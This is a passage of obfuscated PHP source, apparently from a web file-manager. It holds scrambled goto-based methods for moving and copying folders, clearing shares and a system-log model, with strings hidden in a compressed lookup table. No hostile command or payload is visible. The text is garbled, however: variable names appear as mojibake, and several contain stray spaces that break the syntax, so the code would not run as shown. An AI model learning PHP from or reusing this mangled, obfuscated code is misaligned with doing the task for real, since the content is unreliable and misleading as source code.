$c¡®∏êç°é[$EÆﬂ∂»‡Ãá[28]]; $this->lockMoveStart($càÎ∆ÃñêÑ); goto f‘ıÒç†¡; Aùíˆâª“»: if (!$c¡®∏êç°é || !$C¿¶Ñ∞‚÷ˆ || $C¿¶Ñ∞‚÷ˆ[$EÆﬂ∂»‡Ãá[404]] != $EÆﬂ∂»‡Ãá[87]) { return !1; } Hook::trigger($EÆﬂ∂»‡Ãá[572], $e∆∫÷Âì“˜); $this->targetIsDelete = intval($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[424]]); goto Fô•Ó∑∞¨„; Bïàå¢Èç‘: if ($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[479]] == $C¿¶Ñ∞‚÷ˆ[$EÆﬂ∂»‡Ãá[396]]) { if ($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[424]] == $EÆﬂ∂»‡Ãá[87]) { Model($EÆﬂ∂»‡Ãá[422])->restore(array($càÎ∆ÃñêÑ)); } if (!$Cÿ„ª«Ò–ú || $Cÿ„ª«Ò–ú == $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[28]]) { return $càÎ∆ÃñêÑ; } } $e∆∫÷Âì“˜ = $this->pathInfoMore($càÎ∆ÃñêÑ); if ($this->isParentOf($càÎ∆ÃñêÑ, $CáŒ–ÈÔÚ∂)) { return !1; } goto Aùíˆâª“»; f‘ıÒç†¡: $this->lockWriteStart($CáŒ–ÈÔÚ∂, $BÊÇ•«êÜè); $f”√˘ãê∆≥ = array($EÆﬂ∂»‡Ãá[543] => array(), $EÆﬂ∂»‡Ãá[574] => !1); $this->clearShare($càÎ∆ÃñêÑ, $CáŒ–ÈÔÚ∂); goto cë¶©ÓÉ∑Î; A≤Éê∞ñ◊é: $this->folderSizeReset($CáŒ–ÈÔÚ∂); $EÇÒûòåÙı = array($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[479]], $CáŒ–ÈÔÚ∂); if ($c¡®∏êç°é[$EÆﬂ∂»‡Ãá[404]] == $EÆﬂ∂»‡Ãá[87]) { $EÇÒûòåÙı[] = $càÎ∆ÃñêÑ; } goto f∫ÀÎ±¡±Œ; f∫ÀÎ±¡±Œ: $this->updateModifyTime($EÇÒûòåÙı); Model($EÆﬂ∂»‡Ãá[547])->eventMove($càÎ∆ÃñêÑ, $c¡®∏êç°é[$EÆﬂ∂»‡Ãá[479]], $CáŒ–ÈÔÚ∂); Hook::trigger($EÆﬂ∂»‡Ãá[573], $e∆∫÷Âì“˜); goto FΩ‡¶úæ°å; Fπ•‚¥Ãú§: $EÆﬂ∂»‡Ãá =& $_SERVER[™⁄»üÆ]; $c¡®∏êç°é = $this->sourceInfo($càÎ∆ÃñêÑ); $C¿¶Ñ∞‚÷ˆ = $this->sourceInfo($CáŒ–ÈÔÚ∂); goto Bïàå¢Èç‘; D¬áíœ¢…˜: } private function _move($c‰Øá·π¡Œ, $dÿ¿¥∫ªá, $bÜ¡√É‚®ö, &$CáÓ∆å∫ƒæ, $DàÃ©Áß„◊ = '') { goto fÂﬂÍ¨âŒá; Eñ⁄µ©Í∑ï: $BéøäÊè»… = !1; if ($C®ëﬁÔ‡œû) { if ($bÜ¡√É‚®ö == REPEAT_RENAME_FOLDER) { $A¥¨úÖñ‰ù = $this->fileNameAuto($dÿ¿¥∫ªá, $A¥¨úÖñ‰ù, $bÜ¡√É‚®ö, $C®ëﬁÔ‡œû); $dÖµüı–àó = $this->_moveForce($c‰Øá·π¡Œ, $dÿ¿¥∫ªá, $A¥¨úÖñ‰ù); } else { if ($bÜ¡√É‚®ö == REPEAT_RENAME_FOLDER) { $bÜ¡√É‚®ö = REPEAT_RENAME; } $Cœ√Ÿ˘ø¯ƒ = $this->_childrenListSelect($c‰Øá·π¡Œ); foreach ($Cœ√Ÿ˘ø¯ƒ as $bëäõò ¿é) { $this->_move($bëäõò ¿é[$f›Ÿ„—¨Î·[396]], $FıãºÛﬁàË, $bÜ¡√É‚®ö, $CáÓ∆å∫ƒæ); } $BéøäÊè»… = !0; } } else { if ($bÜ¡√É‚®ö == REPEAT_SKIP) { $BéøäÊè»… = !0; } else { if ($bÜ¡√É‚®ö == REPEAT_RENAME || $bÜ¡√É‚®ö == REPEAT_RENAME_FOLDER) { $A¥¨úÖñ‰ù = $this->fileNameAuto($dÿ¿¥∫ªá, $A¥¨úÖñ‰ù, $bÜ¡√É‚®ö, $C®ëﬁÔ‡œû); $dÖµüı–àó = $this->_moveForce($c‰Øá·π¡Œ, $dÿ¿¥∫ªá, $A¥¨úÖñ‰ù); } else { if ($bÜ¡√É‚®ö == REPEAT_REPLACE) { $d≥˘ÙÚ‹öÌ = $this->sourceInfoCache($FıãºÛﬁàË); $BÏ€—†éû¢ = $this->fileHistory($d≥˘ÙÚ‹öÌ, $C éÜ•¨åÀ[$f›Ÿ„—¨Î·[448]], $C éÜ•¨åÀ[$f›Ÿ„—¨Î·[78]]); if ($BÏ€—†éû¢) { $CáÓ∆å∫ƒæ[$f›Ÿ„—¨Î·[543]][] = $C éÜ•¨åÀ[$f›Ÿ„—¨Î·[448]]; } else { $BéøäÊè»… = !0; } } } } } if ($BéøäÊè»… && !$CáÓ∆å∫ƒæ[$f›Ÿ„—¨Î·[574]]) { $CáÓ∆å∫ƒæ[$f›Ÿ„—¨Î·[574]] = !0; } goto Eá·çËçÕÒ; fÂﬂÍ¨âŒá: $f›Ÿ„—¨Î· =& $_SERVER[™⁄»üÆ]; $C éÜ•¨åÀ = $this->sourceInfo($c‰Øá·π¡Œ); $C®ëﬁÔ‡œû = $C éÜ•¨åÀ[$f›Ÿ„—¨Î·[404]] == $f›Ÿ„—¨Î·[87]; goto B ÷¯⁄‡Ëó; Eá·çËçÕÒ: return $dÖµüı–àó; goto cù∂¥Üä‡ó; B ÷¯⁄‡Ëó: $A¥¨úÖñ‰ù = $DàÃ©Áß„◊ ? $DàÃ©Áß„◊ : $C éÜ•¨åÀ[$f›Ÿ„—¨Î·[28]]; $FıãºÛﬁàË = $this->fileNameExistCache($dÿ¿¥∫ªá, $A¥¨úÖñ‰ù); $this->lockMoveStart($c‰Øá·π¡Œ); goto Aê°Â‰…ÖØ; Aê°Â‰…ÖØ: $this->lockWriteStart($dÿ¿¥∫ªá, $A¥¨úÖñ‰ù); if (!$FıãºÛﬁàË) { return $this->_moveForce($c‰Øá·π¡Œ, $dÿ¿¥∫ªá, $A¥¨úÖñ‰ù); } $dÖµüı–àó = $FıãºÛﬁàË; goto Eñ⁄µ©Í∑ï; cù∂¥Üä‡ó: } private function _moveForce($aæ“âΩîàÑ, $dâ≠œûçü‰, $bﬂÉ‹¥√”) { goto BíîÜàëØö; BíîÜàëØö: $Aí´ÚﬁÖ¿Ú =& $_SERVER[™⁄»üÆ]; $EÛª€πòÒª = $this->sourceInfo($aæ“âΩîàÑ); $bÓ’Û¿‘äé = $this->sourceInfo($dâ≠œûçü‰); goto BÉæÁú¯ﬁÒ; Eòóã≤∆€ : if (!$A€’€éπ≤É && $this->moveClearAuth) { Model($Aí´ÚﬁÖ¿Ú[483])->authClear($aæ“âΩîàÑ); } $Dô’ô™…‡” = $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[424]] == $Aí´ÚﬁÖ¿Ú[87] && $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[424]] != $Aí´ÚﬁÖ¿Ú[87]; if ($Dô’ô™…‡”) { $fÑ™Ïı¯‹ñ[$Aí´ÚﬁÖ¿Ú[423]] = 0; } goto d€˘≠¯®®ã; d€˘≠¯®®ã: if ($e„äÌ∑≠∑“) { $C˜ãÍ≤ﬂˆÉ = array($Aí´ÚﬁÖ¿Ú[567] => array($Aí´ÚﬁÖ¿Ú[526], $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[503]] . $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[396]] . $Aí´ÚﬁÖ¿Ú[527])); $E‰çÊ≈ô»∑ = $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[503]] . $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[396]] . $Aí´ÚﬁÖ¿Ú[47]; $D¥°ªﬁ±÷ = $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[503]] . $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[396]] . $Aí´ÚﬁÖ¿Ú[47] . $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[396]] . $Aí´ÚﬁÖ¿Ú[47]; $aèﬂÉ“âöƒ = array($Aí´ÚﬁÖ¿Ú[567] => array($Aí´ÚﬁÖ¿Ú[575], "\x72\x65\160\x6c\x61\143\x65\x28\x70\x61\x72\145\156\164\114\x65\166\x65\154\x2c\47{$E‰çÊ≈ô»∑}\47\54\x27{$D¥°ªﬁ±÷}\x27\x29"), $Aí´ÚﬁÖ¿Ú[563] => $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[405]], $Aí´ÚﬁÖ¿Ú[564] => $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[485]]); if ($Dô’ô™…‡”) { $aèﬂÉ“âöƒ[$Aí´ÚﬁÖ¿Ú[423]] = 0; } $this->where($C˜ãÍ≤ﬂˆÉ)->data($aèﬂÉ“âöƒ)->save(); } $this->where(array($Aí´ÚﬁÖ¿Ú[411] => $aæ“âΩîàÑ))->data($fÑ™Ïı¯‹ñ)->save(); return $aæ“âΩîàÑ; goto aÌí˘Í≠Âö; BÉæÁú¯ﬁÒ: $e„äÌ∑≠∑“ = $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[404]] == $Aí´ÚﬁÖ¿Ú[87]; $fÑ™Ïı¯‹ñ = array($Aí´ÚﬁÖ¿Ú[395] => $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[396]], $Aí´ÚﬁÖ¿Ú[567] => $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[503]] . $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[396]] . $Aí´ÚﬁÖ¿Ú[47], $Aí´ÚﬁÖ¿Ú[563] => $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[405]], $Aí´ÚﬁÖ¿Ú[564] => $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[485]], $Aí´ÚﬁÖ¿Ú[566] => USER_ID, $Aí´ÚﬁÖ¿Ú[414] => $bﬂÉ‹¥√”); $A€’€éπ≤É = $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[405]] == SourceModel::TYPE_GROUP && $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[405]] == SourceModel::TYPE_GROUP && $EÛª€πòÒª[$Aí´ÚﬁÖ¿Ú[485]] == $bÓ’Û¿‘äé[$Aí´ÚﬁÖ¿Ú[485]]; goto Eòóã≤∆€ ; aÌí˘Í≠Âö: } private function clearShare($dÌÎù£≥ÍÌ, $A íº˘Ñπˆ) { goto a◊ÌÜ•Èñà; dî˘·ÿñºˆ: Model($B¡èµ∏íñ∫[577])->where($AõâŸ≥ñ„ˆ)->save(array($B¡èµ∏íñ∫[476] => 0)); Model($B¡èµ∏íñ∫[578])->where($AõâŸ≥ñ„ˆ)->delete(); goto cØååÒ¡ö‘; Fñ•ïûçãÏ: if (!$cıèµ£¨¬≥) { return; } $cıèµ£¨¬≥ = array_to_keyvalue($cıèµ£¨¬≥, $B¡èµ∏íñ∫[33], $B¡èµ∏íñ∫[469]); $AõâŸ≥ñ„ˆ = array($B¡èµ∏íñ∫[469] => array($B¡èµ∏íñ∫[7], $cıèµ£¨¬≥)); goto dî˘·ÿñºˆ; a◊ÌÜ•Èñà: $B¡èµ∏íñ∫ =& $_SERVER[™⁄»üÆ]; $D∑˜¿ÒØîŒ = $this->sourceInfo($dÌÎù£≥ÍÌ); $aÒ“’˘Ç∑⁄ = $this->sourceInfo($A íº˘Ñπˆ); goto D±ÒÏ¯Áà¿; D±ÒÏ¯Áà¿: if ($D∑˜¿ÒØîŒ[$B¡èµ∏íñ∫[485]] == $aÒ“’˘Ç∑⁄[$B¡èµ∏íñ∫[485]] && $D∑˜¿ÒØîŒ[$B¡èµ∏íñ∫[405]] == $B¡èµ∏íñ∫[576]) { return; } $AõâŸ≥ñ„ˆ = array($B¡èµ∏íñ∫[503] => array($B¡èµ∏íñ∫[526], $D∑˜¿ÒØîŒ[$B¡èµ∏íñ∫[503]] . $dÌÎù£≥ÍÌ . $B¡èµ∏íñ∫[527])); $dçÿ¶º‹íÖ = $this->field($B¡èµ∏íñ∫[411])->where($AõâŸ≥ñ„ˆ)->getField($B¡èµ∏íñ∫[396], !0); goto f£¢Úõ®ﬁ ; f£¢Úõ®ﬁ : if (!$dçÿ¶º‹íÖ) { return; } $AõâŸ≥ñ„ˆ = array($B¡èµ∏íñ∫[396] => array($B¡èµ∏íñ∫[7], $dçÿ¶º‹íÖ), $B¡èµ∏íñ∫[476] => 1); $cıèµ£¨¬≥ = Model($B¡èµ∏íñ∫[577])->field($B¡èµ∏íñ∫[469])->where($AõâŸ≥ñ„ˆ)->select(); goto Fñ•ïûçãÏ; cØååÒ¡ö‘: } public function copyFolderFromIO($E‡ŒÕÁ∆Øê, $aÊ◊ûúâÍ≤, $Eùß›ïÇ¨Ó, $Aπ”Î¡åïã, $B¿Œ≤ôñ√”, $aâ¿’£à¬√ = false) { goto d¬êêπÔ∂Û; EÒ∞”¢Ï’‘: $this->updateModifyTime($Eùß›ïÇ¨Ó); return $DÙÌäêïåé; goto B¡√íæõÒ›; d¬êêπÔ∂Û: $dÏﬂ≠âí∏¬ =& $_SERVER[™⁄»üÆ]; $D‚äÑúâÎƒ = array($dÏﬂ≠âí∏¬[544] => array(), $dÏﬂ≠âí∏¬[545] => array(), $dÏﬂ≠âí∏¬[543] => array(), $dÏﬂ≠âí∏¬[579] => array()); $a∑±ï‰èú“ = $aâ¿’£à¬√ ? $aâ¿’£à¬√ : $E‡ŒÕÁ∆Øê->pathThis($aÊ◊ûúâÍ≤); goto cŒ‹µ˘’à˘; cŒ‹µ˘’à˘: $Bß—ì…ËÏ⁄ = $this->fileNameExist($Eùß›ïÇ¨Ó, $a∑±ï‰èú“); $DÙÌäêïåé = $this->mkdir($Eùß›ïÇ¨Ó, $a∑±ï‰èú“, $Aπ”Î¡åïã); if (!$Bß—ì…ËÏ⁄ || $Aπ”Î¡åïã == REPEAT_RENAME_FOLDER) { $Aπ”Î¡åïã = !1; } goto fÎöëÕó œ; Aº˜ë»Ú’ı: Hook::trigger($dÏﬂ≠âí∏¬[581]); if ($DÙÌäêïåé) { $this->folderSizeResetChildren($DÙÌäêïåé); } $this->_childrenListClear(); goto Dëé ıÖ∫¢; Dëé ıÖ∫¢: Model($dÏﬂ≠âí∏¬[546])->addAll($D‚äÑúâÎƒ[$dÏﬂ≠âí∏¬[544]], array(), !0); Model($dÏﬂ≠âí∏¬[547])->eventCopy($DÙÌäêïåé); $this->saveAll($D‚äÑúâÎƒ[$dÏﬂ≠âí∏¬[545]]); goto c‘î≤†∂„ß; c‘î≤†∂„ß: Model($dÏﬂ≠âí∏¬[451])->linkAdd($D‚äÑúâÎƒ[$dÏﬂ≠âí∏¬[543]]); Model($dÏﬂ≠âí∏¬[451])->remove($D‚äÑúâÎƒ[$dÏﬂ≠âí∏¬[579]]); $this->folderSizeReset($Eùß›ïÇ¨Ó); goto EÒ∞”¢Ï’‘; fÎöëÕó œ: if ($Bß—ì…ËÏ⁄) { $this->_childrenAllMake($Bß—ì…ËÏ⁄); } Hook::trigger($dÏﬂ≠âí∏¬[580]); $this->_copyChildTo($E‡ŒÕÁ∆Øê, $aÊ◊ûúâÍ≤, $DÙÌäêïåé, $Aπ”Î¡åïã, $D‚äÑúâÎƒ, $B¿Œ≤ôñ√”); goto Aº˜ë»Ú’ı; B¡√íæõÒ›: } private function _copyChildTo($bÕ∆üŒñµ’, $E∑©¶µ›Ω, $c‰∆·òßœ∞, $eŸ¶·≥“∑ã, &$fÑÉ‰ññùâ, $fË·£¨Õ‰≈) { goto CìéÑÑêŸÎ; eªÛè‚ÀìÎ: $FÑÈµ·∆å¢ = $FÑÈµ·∆å¢ ? $FÑÈµ·∆å¢ : array($DÜçíôÖÆâ[74] => array(), $DÜçíôÖÆâ[75] => array()); $BíÑÌ±ãßï = array_merge($FÑÈµ·∆å¢[$DÜçíôÖÆâ[74]], $FÑÈµ·∆å¢[$DÜçíôÖÆâ[75]]); $bºò§óº®« = $this->_addFiles($bÕ∆üŒñµ’, $FÑÈµ·∆å¢[$DÜçíôÖÆâ[74]], $fË·£¨Õ‰≈); goto a˜ÉêÂ¢¥Ñ; c§ Ööê¯”: if (!empty($C¶ÑçÑÑøÕ)) { $this->addAll($C¶ÑçÑÑøÕ); $this->_childrenListSelect($c‰∆·òßœ∞); } $Dπ‰À©îíè = $this->_childrenList($c‰∆·òßœ∞); $Dπ‰À©îíè = array_to_keyvalue($Dπ‰À©îíè, $DÜçíôÖÆâ[28]); goto cÒÒÛ˜∑®å; a˜ÉêÂ¢¥Ñ: $C¶ÑçÑÑøÕ = array(); foreach ($BíÑÌ±ãßï as &$d‹∆¬ÑåãÁ) { goto fù≠·ô‘öÑ; fù≠·ô‘öÑ: if (isset($bºò§óº®«[$d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]]])) { $d‹∆¬ÑåãÁ = $bºò§óº®«[$d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]]]; } $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[404]] = $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[29]] == $DÜçíôÖÆâ[77]; $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[406]] = _get($d‹∆¬ÑåãÁ, $DÜçíôÖÆâ[168], $DÜçíôÖÆâ[33]); goto EÁà±æ®ãê; EÁà±æ®ãê: $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[78]] = _get($d‹∆¬ÑåãÁ, $DÜçíôÖÆâ[78], 0); $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]] = _get($d‹∆¬ÑåãÁ, $DÜçíôÖÆâ[448], 0); if (!isset($d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[582]]) && $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]]) { $fÑÉ‰ññùâ[$DÜçíôÖÆâ[579]][] = $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]]; } goto b¥÷Œ⁄´ñ ; b¥÷Œ⁄´ñ : if ($eŸ¶·≥“∑ã) { $fﬂËë••‡æ = $this->fileNameExistCache($c‰∆·òßœ∞, $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]]); if ($fﬂËë••‡æ) { if ($d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[404]] || $eŸ¶·≥“∑ã == REPEAT_SKIP) { continue; } if ($eŸ¶·≥“∑ã == REPEAT_REPLACE) { $e⁄¢”◊—Œ¶ = $this->sourceInfoCache($fﬂËë••‡æ); $føÊè‚î∑ù = $this->fileHistory($e⁄¢”◊—Œ¶, $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]], $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[78]]); if ($føÊè‚î∑ù) { $fÑÉ‰ññùâ[$DÜçíôÖÆâ[543]][] = $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]]; } continue; } else { if ($eŸ¶·≥“∑ã == REPEAT_RENAME) { $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]] = $this->fileNameAutoCache($c‰∆·òßœ∞, $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]], $eŸ¶·≥“∑ã, !1); } } } } if (!$d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[404]] && $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]]) { $fÑÉ‰ññùâ[$DÜçíôÖÆâ[543]][] = $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[448]]; } $C¶ÑçÑÑøÕ[] = $this->_makeItemData($d‹∆¬ÑåãÁ, $fÕ‘≥Ó™øÏ, $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]]); goto b°í”Õù∫ê; b°í”Õù∫ê: } unset($d‹∆¬ÑåãÁ); goto c§ Ööê¯”; cÒÒÛ˜∑®å: foreach ($BíÑÌ±ãßï as $d‹∆¬ÑåãÁ) { $e⁄¢”◊—Œ¶ = $Dπ‰À©îíè[$d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[28]]]; $bé◊ñëíˆˆ = $e⁄¢”◊—Œ¶[$DÜçíôÖÆâ[396]]; $this->_copyApplyMeta($e⁄¢”◊—Œ¶, $fÑÉ‰ññùâ); if ($d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[29]] == $DÜçíôÖÆâ[77]) { $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[76]] = $bÕ∆üŒñµ’->getPathInner($d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[76]]); $this->_copyChildTo($bÕ∆üŒñµ’, $d‹∆¬ÑåãÁ[$DÜçíôÖÆâ[76]], $bé◊ñëíˆˆ, $eŸ¶·≥“∑ã, $fÑÉ‰ññùâ, $fË·£¨Õ‰≈); } } goto CÃµæ”è÷◊; CìéÑÑêŸÎ: $DÜçíôÖÆâ =& $_SERVER[™⁄»üÆ]; $fÕ‘≥Ó™øÏ = $this->sourceInfoCache($c‰∆·òßœ∞); $FÑÈµ·∆å¢ = $bÕ∆üŒñµ’->listPath($E∑©¶µ›Ω); goto eªÛè‚ÀìÎ; CÃµæ”è÷◊: } private function _addFiles($f÷ùÃ◊∑çÎ, $A∂≤£∆úÜ», $A–÷åßëƒø) { goto D¥√À˘í«⁄; B¨¢ÿŒﬁÉ’: $D¯È ú”üÕ = $D¯È ú”üÕ ? $D¯È ú”üÕ : array(); foreach ($D¯È ú”üÕ as $fö‹û…ïä–) { if (!isset($Fôÿ§¡ë‚‘[$fö‹û…ïä–[$BËõÊ®±úΩ[170]]])) { continue; } $fæÃ≤≈¬√µ =& $Fôÿ§¡ë‚‘[$fö‹û…ïä–[$BËõÊ®±úΩ[170]]]; foreach ($fæÃ≤≈¬√µ as &$A∑∫∑™ë”≠) { $A∑∫∑™ë”≠[$BËõÊ®±úΩ[448]] = $fö‹û…ïä–[$BËõÊ®±úΩ[448]]; } unset($A∑∫∑™ë”≠); } $d®Ó√§ú‹ñ = array(); goto dÁ∞¬éƒØ´; d∆≠ñ¶ù™ø: $FØçÖˆ€©‡ = Model($BËõÊ®±úΩ[585]); $D¯È ú”üÕ = $FØçÖˆ€©‡->where($CﬁØóï÷éå)->select(); $D¯È ú”üÕ = $D¯È ú”üÕ ? $D¯È ú”üÕ : array(); goto d¡√≥…≥ï¢; dÁ∞¬éƒØ´: foreach ($A∂≤£∆úÜ» as $A¨âóØê¶ì) { $d®Ó√§ú‹ñ[$A¨âóØê¶ì[$BËõÊ®±úΩ[28]]] = $A¨âóØê¶ì; } return $d®Ó√§ú‹ñ; goto B∫ìõƒˆÔœ; d¡√≥…≥ï¢: foreach ($D¯È ú”üÕ as $fö‹û…ïä–) { if (!isset($Fôÿ§¡ë‚‘[$fö‹û…ïä–[$BËõÊ®±úΩ[170]]])) { continue; } $E”ÿßÂ∑Ÿ≥ = $Fôÿ§¡ë‚‘[$fö‹û…ïä–[$BËõÊ®±úΩ[170]]]; foreach ($E”ÿßÂ∑Ÿ≥ as &$A∑∫∑™ë”≠) { $A∑∫∑™ë”≠[$BËõÊ®±úΩ[448]] = $fö‹û…ïä–[$BËõÊ®±úΩ[448]]; $A∑∫∑™ë”≠[$BËõÊ®±úΩ[582]] = !0; } unset($A∑∫∑™ë”≠); } $bﬁ±∞îŒ‘¯ = array(); foreach ($A∂≤£∆úÜ» as $Dáù’µÜÍ±) { if (isset($Dáù’µÜÍ±[$BËõÊ®±úΩ[582]]) && $Dáù’µÜÍ±[$BËõÊ®±úΩ[582]]) { continue; } $d»è¥Î·Ûí = $f÷ùÃ◊∑çÎ->getPathInner($Dáù’µÜÍ±[$BËõÊ®±úΩ[76]]); $aÆˆ“ﬂÑ≠« = $FØçÖˆ€©‡->addFileMake($d»è¥Î·Ûí, $Dáù’µÜÍ±[$BËõÊ®±úΩ[78]], $Dáù’µÜÍ±[$BËõÊ®±úΩ[171]], $Dáù’µÜÍ±[$BËõÊ®±úΩ[170]], $Dáù’µÜÍ±[$BËõÊ®±úΩ[28]], $A–÷åßëƒø); $bﬁ±∞îŒ‘¯[] = $aÆˆ“ﬂÑ≠«; } goto eº¿≈ﬂ‘…±; eº¿≈ﬂ‘…±: $FØçÖˆ€©‡->addAll($bﬁ±∞îŒ‘¯); $CﬁØóï÷éå = array($BËõÊ®±úΩ[170] => array($BËõÊ®±úΩ[7], array_keys($Fôÿ§¡ë‚‘))); $D¯È ú”üÕ = $FØçÖˆ€©‡->where($CﬁØóï÷éå)->select(); goto B¨¢ÿŒﬁÉ’; F”¥¯Í±üè: foreach ($A∂≤£∆úÜ» as &$A∑∫∑™ë”≠) { goto D„ùñºÒáΩ; D·· Ø¿¯ö: $c‡Á∫Ïº»ÿ = $f÷ùÃ◊∑çÎ->hashMd5($A∑∫∑™ë”≠[$BËõÊ®±úΩ[76]]); if (strlen($c‡Á∫Ïº»ÿ) > 10 && !isset($Fôÿ§¡ë‚‘[$c‡Á∫Ïº»ÿ])) { $Fôÿ§¡ë‚‘[$c‡Á∫Ïº»ÿ] = array(); } $A∑∫∑™ë”≠[$BËõÊ®±úΩ[171]] = $Fœ„⁄„‘≥; goto CÀ¥»æ–Êï; D„ùñºÒáΩ: Hook::trigger($BËõÊ®±úΩ[583], $A∑∫∑™ë”≠); $A∑∫∑™ë”≠[$BËõÊ®±úΩ[76]] = $f÷ùÃ◊∑çÎ->getPathInner($A∑∫∑™ë”≠[$BËõÊ®±úΩ[76]]); $Fœ„⁄„‘≥ = $f÷ùÃ◊∑çÎ->hashSimple($A∑∫∑™ë”≠[$BËõÊ®±úΩ[76]]); goto D·· Ø¿¯ö; e˘∂ŒÒ®ßÊ: if (count($Fôÿ§¡ë‚‘[$c‡Á∫Ïº»ÿ]) > 1) { $A∑∫∑™ë”≠[$BËõÊ®±úΩ[582]] = !0; } goto DÜ˘–¬Ñí∂; CÀ¥»æ–Êï: $A∑∫∑™ë”≠[$BËõÊ®±úΩ[170]] = $c‡Á∫Ïº»ÿ; Hook::trigger($BËõÊ®±úΩ[584], $A∑∫∑™ë”≠); $Fôÿ§¡ë‚‘[$c‡Á∫Ïº»ÿ][] =& $A∑∫∑™ë”≠; goto e˘∂ŒÒ®ßÊ; DÜ˘–¬Ñí∂: } unset($A∑∫∑™ë”≠); $CﬁØóï÷éå = array($BËõÊ®±úΩ[170] => array($BËõÊ®±úΩ[7], array_keys($Fôÿ§¡ë‚‘))); goto d∆≠ñ¶ù™ø; D¥√À˘í«⁄: $BËõÊ®±úΩ =& $_SERVER[™⁄»üÆ]; if (!$A∂≤£∆úÜ» || count($A∂≤£∆úÜ») == 0) { return array(); } $Fôÿ§¡ë‚‘ = array(); goto F”¥¯Í±üè; B∫ìõƒˆÔœ: } } define($_SERVER[™⁄»üÆ][586], $_SERVER[™⁄»üÆ][587]); goto b§ºÃ≥Û’è; c£Ω¢¨‡ôµ: define($_SERVER[™⁄»üÆ][0], $_SERVER[™⁄»üÆ][1]); $_SERVER[ÒÄÏ¸†ªÇµ] = explode($_SERVER[™⁄»üÆ][2], gzinflate(substr($_SERVER[™⁄»üÆ][3], 10, -8))); function binCheckEq($A≤ÊóÊ‘¥™, $d÷ûÆÔòåÔ) { return $A≤ÊóÊ‘¥™ == $d÷ûÆÔòåÔ; } goto D∞‰“ùìƒÖ; BòÆ÷Ñ·ÿÉ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\141\164\x65\124\x69\155\145", "\164\x69\155\145", "\x69\156\x73\145\x72\164", "\146\165\x6e\143\164\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $bÒõàé·Ωà =& $_SERVER[™⁄»üÆ]; return array($bÒõàé·Ωà[2022] => LNG($bÒõàé·Ωà[2023]), $bÒõàé·Ωà[2024] => LNG($bÒõàé·Ωà[2025]), $bÒõàé·Ωà[1646] => LNG($bÒõàé·Ωà[2026]), $bÒõàé·Ωà[2027] => LNG($bÒõàé·Ωà[2028]), $bÒõàé·Ωà[2029] => LNG($bÒõàé·Ωà[2030]), $bÒõàé·Ωà[2031] => LNG($bÒõàé·Ωà[2032]), $bÒõàé·Ωà[2033] => LNG($bÒõàé·Ωà[2034]), $bÒõàé·Ωà[1676] => LNG($bÒõàé·Ωà[2034]), $bÒõàé·Ωà[1677] => LNG($bÒõàé·Ωà[2035]), $bÒõàé·Ωà[2036] => LNG($bÒõàé·Ωà[2037]), $bÒõàé·Ωà[2038] => LNG($bÒõàé·Ωà[2039]), $bÒõàé·Ωà[2040] => LNG($bÒõàé·Ωà[2041]), $bÒõàé·Ωà[2042] => LNG($bÒõàé·Ωà[2043]), $bÒõàé·Ωà[1674] => LNG($bÒõàé·Ωà[2044]), $bÒõàé·Ωà[2045] => LNG($bÒõàé·Ωà[2046]), $bÒõàé·Ωà[1681] => LNG($bÒõàé·Ωà[2047]), $bÒõàé·Ωà[2048] => LNG($bÒõàé·Ωà[2049]), $bÒõàé·Ωà[2050] => LNG($bÒõàé·Ωà[2051]), $bÒõàé·Ωà[2052] => LNG($bÒõàé·Ωà[2053]), $bÒõàé·Ωà[2054] => LNG($bÒõàé·Ωà[2055]), $bÒõàé·Ωà[1684] => LNG($bÒõàé·Ωà[2056]), 